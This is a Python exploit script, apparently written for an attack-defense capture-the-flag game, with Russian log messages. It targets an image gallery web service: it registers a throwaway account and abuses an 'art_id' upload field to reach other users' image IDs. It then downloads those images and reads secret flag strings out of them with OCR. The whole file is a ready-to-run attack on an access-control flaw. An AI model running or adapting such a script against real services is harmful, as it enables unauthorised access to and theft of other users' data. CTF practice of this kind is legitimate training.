#!/usr/bin/env python3
import sys
import requests
import re
import io
import random
import string
import time
from urllib.parse import quote
from PIL import Image
import pytesseract

TIMEOUT = 5
FLAG_PATTERN = re.compile(r'[A-Z0-9]{31}=')
GALLERY_ITEM_PATTERN = re.compile(r'<div class="gallery-item">.*?<img src="([^"]+)".*?<div class="gallery-name">([^<]+)</div>.*?</div>', re.DOTALL)

def register_random_user(host, port):
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
    password = "123"
    print(f"[*] Регистрация пользователя {username}...")
    encoded_username = quote(username)
    register_data = f"username={encoded_username}&password={password}"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        r = session.post(f"{base_url}/register", data=register_data, headers=headers, timeout=TIMEOUT)
        if r.status_code == 200:
            access_token = session.cookies.get("access_token")
            if access_token:
                print(f"[+] Успешная регистрация")
                return session
    except Exception as e:
        print(f"[!] Ошибка регистрации: {e}")
    return None

def create_test_image(text=None):
    from PIL import ImageDraw
    img = Image.new('RGB', (100, 100), color='white')
    d = ImageDraw.Draw(img)
    if text is None:
        text = f"TEST{random.randint(1000, 9999)}"
    d.text((10, 10), str(text)[:20], fill='black')
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='BMP')
    img_bytes.seek(0)
    return img_bytes.read()

def upload_test_image(session, host, port):
    base_url = f"http://{host}:{port}"
    image_data = create_test_image("TEST")
    boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"test.bmp\"\r\n"
        f"Content-Type: image/bmp\r\n\r\n"
    ).encode()
    body += image_data
    body += f"\r\n--{boundary}--\r\n".encode()
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body))
    }
    try:
        r = session.post(f"{base_url}/upload", data=body, headers=headers, timeout=TIMEOUT)
        time.sleep(0.5)
        r = session.get(f"{base_url}/", timeout=TIMEOUT)
        if r.status_code == 200:
            gallery_items = GALLERY_ITEM_PATTERN.findall(r.text)
            if gallery_items:
                first_img_src, first_img_name = gallery_items[0]
                print(f"[*] Первая картинка в галерее: {first_img_name}")
                match = re.search(r'(\d+)\.bmp', first_img_name)
                if match:
                    art_id = int(match.group(1))
                    print(f"[+] Текущий ID: {art_id}")
                    return art_id
    except Exception as e:
        print(f"[!] Ошибка при загрузке: {e}")
    return None

def upload_image_with_art_id(session, host, port, art_id):
    base_url = f"http://{host}:{port}"
    image_data = create_test_image(f"ART{art_id}")
    boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"art_id\"\r\n\r\n"
        f"{art_id}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"test.bmp\"\r\n"
        f"Content-Type: image/bmp\r\n\r\n"
    ).encode()
    body += image_data
    body += f"\r\n--{boundary}--\r\n".encode()
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body))
    }
    try:
        r = session.post(f"{base_url}/upload", data=body, headers=headers, timeout=TIMEOUT, allow_redirects=False)
        return r.status_code
    except Exception as e:
        print(f"[!] Ошибка при загрузке art_id={art_id}: {e}")
        return None

def extract_text_from_image(image_data):
    try:
        image = Image.open(io.BytesIO(image_data))
        custom_config = r'--psm 6 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789='
        text = pytesseract.image_to_string(image, config=custom_config)
        text = ''.join(text.split()).upper()
        if text:
            print(f"[*] Tesseract распознал: {text[:100]}...")
        return text
    except Exception as e:
        print(f"[!] Ошибка OCR: {e}")
        return ""

def download_and_check_image(session, image_url):
    try:
        r = session.get(image_url, timeout=TIMEOUT)
        if r.status_code == 200:
            content_type = r.headers.get('content-type', '')
            if content_type.startswith('image/'):
                text = extract_text_from_image(r.content)
                flags = FLAG_PATTERN.findall(text)
                return flags
    except Exception as e:
        print(f"[!] Ошибка при скачивании изображения: {e}")
    return []

def check_images_for_flags(session, host, port, start_id, end_id):
    base_url = f"http://{host}:{port}"
    flags_found = []
    print(f"\n[*] Проверка изображений от ID {start_id} до {end_id}...")
    for art_id in range(start_id, end_id - 1, -1):
        if art_id < 1:
            break
        image_url = f"{base_url}/media/pixel_{art_id}.bmp"
        print(f"[*] Проверяю ID {art_id}...")
        flags = download_and_check_image(session, image_url)
        for flag in flags:
            if flag not in flags_found:
                flags_found.append(flag)
                print(f"[+] Найден флаг в pixel_{art_id}.bmp: {flag}")
        time.sleep(0.1)
    return flags_found

def check_tesseract():
    try:
        pytesseract.get_tesseract_version()
        return True
    except Exception:
        return False

def main():
    if len(sys.argv) < 3:
        print("Usage: sploit.py HOST PORT [MAX_CHECK]")
        print("Example: sploit.py 127.0.0.1 1337 50")
        sys.exit(1)
    if not check_tesseract():
        print("[!] Tesseract OCR не найден!")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    max_check = 50
    if len(sys.argv) >= 4:
        max_check = int(sys.argv[3])
    print("[*] Tesseract OCR инициализирован")
    print("\n[*] Шаг 1: Регистрация нового пользователя")
    session = register_random_user(host, port)
    if not session:
        print("[!] Не удалось создать аккаунт")
        sys.exit(1)
    print("\n[*] Шаг 2: Загрузка тестовой картинки для получения текущего ID")
    current_id = upload_test_image(session, host, port)
    if not current_id:
        print("[!] Не удалось получить текущий ID")
        sys.exit(1)
    print(f"\n[*] Шаг 3: Загрузка картинок с art_id от {current_id-1} до 1")
    for art_id in range(current_id - 1, 0, -1):
        if art_id < current_id - max_check:
            print(f"[*] Достигнут лимит проверки в {max_check} картинок")
            break
        print(f"[*] Загружаю картинку с art_id={art_id}...")
        status_code = upload_image_with_art_id(session, host, port, art_id)
        if status_code == 302:
            print(f"[+] art_id={art_id} успешно загружен")
        elif status_code == 200:
            print(f"[?] art_id={art_id} вернул 200 (возможно уже существует)")
        else:
            print(f"[!] art_id={art_id} вернул {status_code}")
        time.sleep(0.1)
    print(f"\n[*] Шаг 4: Проверка картинок на наличие флагов")
    end_id = max(1, current_id - max_check)
    flags = check_images_for_flags(session, host, port, current_id - 1, end_id)
    print("\n" + "="*50)
    print("НАЙДЕННЫЕ ФЛАГИ:")
    print("="*50)
    if flags:
        for flag in sorted(flags):
            print(flag)
        print(f"\n[*] Всего найдено флагов: {len(flags)}")
    else:
        print("[!] Флаги не найдены")
    print(f"\n[*] Готово! Загружено и проверено {min(current_id-1, max_check)} картинок")

if __name__ == "__main__":
    main()